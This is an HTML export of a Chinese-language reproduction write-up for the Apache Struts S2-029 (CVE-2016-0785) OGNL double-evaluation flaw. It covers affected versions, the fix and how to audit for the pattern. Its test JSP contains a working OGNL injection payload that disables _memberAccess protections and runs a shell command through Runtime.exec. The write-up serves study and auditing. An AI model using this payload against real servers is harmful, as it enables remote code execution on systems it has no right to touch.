<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2016-0785s2-029"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2016-0785</span><span class="csECDA2D3">）</span><span class="csDE05BCC">S2-029</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">代码执行过程大致为先尝试获取</span><span class="cs8926E06">value</span><span class="cs9C1B1871">的值，如果</span><span class="cs8926E06">value</span><span class="cs9C1B1871">为空，那么就二次解释执行了</span><span class="cs8926E06">name</span><span class="cs9C1B1871">。并且在执行前给</span><span class="cs8926E06">name</span><span class="cs9C1B1871">加上了</span><span class="cs8926E06">&rdquo;%{}&rdquo;</span><span class="cs9C1B1871">。最终造成二次执行。因此需要的条件极为苛刻，特殊的代码，</span><span class="cs8926E06">value</span><span class="cs9C1B1871">值为空，可以传参到</span><span class="cs8926E06">value</span><span class="cs9C1B1871">，控制</span><span class="cs8926E06">name</span><span class="cs9C1B1871">，严格来说应该是个本地漏洞。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Struts 2.0.0 - Struts 2.3.24.1</span><span class="cs9C1B1871">（</span><span class="cs8926E06">2.3.20.3</span><span class="cs9C1B1871">除外）</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">S2-029</span><span class="cs9C1B1871">的公告说是可能的远程代码执行。而且依然是</span><span class="cs8926E06">ognl</span><span class="cs9C1B1871">导致的。</span></p><p class="cs3A447A38"><span class="cs9FB05234">The Apache Struts frameworks performs double evaluation of attributes values assigned to certain tags so it is possible to pass in a value that will be evaluated again when a tag&rsquo;s attributes will be rendered.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">目前网上已经有一些成熟的参考的资料了。详见文末参考资料。这次的漏洞虽然是代码执行。但是风险不高，需要开发者使用了特定的代码写法才会导致漏洞。需要直接将用户提交的数据通过标签设置成属性值。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">比如：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;s:i18n name=&quot;%&amp;#123#request.lan&amp;#125&quot;&gt;xxxxx&lt;/s:i18n&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;set var=&quot;%&amp;#123#parameters.tang3&amp;#125&quot;/&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs9FB05234">%&amp;#123#&amp;#125</span><span class="cs9C1B1871">的方式获取用户输入放入标签属性，会导致代码执行。</span><span class="cs8926E06">struts2</span><span class="cs9C1B1871">的修复方式也是直接过滤了</span><span class="cs9FB05234">%&amp;#123&amp;#125</span><span class="cs9C1B1871">形式的字符串的</span><span class="cs8926E06">ognl</span><span class="cs9C1B1871">解析。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs3A447A38"><span class="cs7FFD2630">这段代码的修改用来处理掉了非</span><span class="cs9FB05234">%&amp;#123</span><span class="cs7FFD2630">开头，</span><span class="cs9FB05234">&amp;#125</span><span class="cs7FFD2630">结尾的字符串进行</span><span class="cs9FB05234">ognl</span><span class="cs7FFD2630">解析的功能，这里我们来举个例子：</span><span class="cs9FB05234">bar%&amp;#1232+3&amp;#125</span><span class="cs7FFD2630">，在修改之前的代码中</span><span class="cs9FB05234">2+3</span><span class="cs7FFD2630">是会被作为</span><span class="cs9FB05234">ognl</span><span class="cs7FFD2630">执行的。那么修改后，这种形式就只会被当做字符串来返回。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">审计方式就是查看是否有</span><span class="cs9FB05234">%&amp;#123#&amp;#125</span><span class="cs9C1B1871">这种方式获取用户输入变量复制给标签属性的代码写法。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;%@page import=&quot;java.util.HashSet&quot;%&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;html&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;head&gt;&lt;title&gt;Demo jsp page&lt;/title&gt;&lt;/head&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;request.setAttribute(&quot;lan&quot;, &quot;&#39;),#_memberAccess[&#39;allowPrivateAccess&#39;]=true,#_memberAccess[&#39;allowProtectedAccess&#39;]=true,#_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,#_memberAccess[&#39;excludedPackageNamePatterns&#39;]=#_memberAccess[&#39;acceptProperties&#39;],#_memberAccess[&#39;excludedClasses&#39;]=#_memberAccess[&#39;acceptProperties&#39;],#a=@java.lang.Runtime@getRuntime(),#a.exec(&#39;touch /tmp/1111&#39;),new java.lang.String(&#39;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">%&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;s:i18n name=&quot;%&amp;#123#request.lan&amp;#125&quot;&gt;xxxxx&lt;/s:i18n&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/html&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查看</span><span class="cs8926E06">tmp</span><span class="cs9C1B1871">目录文件已经生成。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.png</span></p></body>
</html>
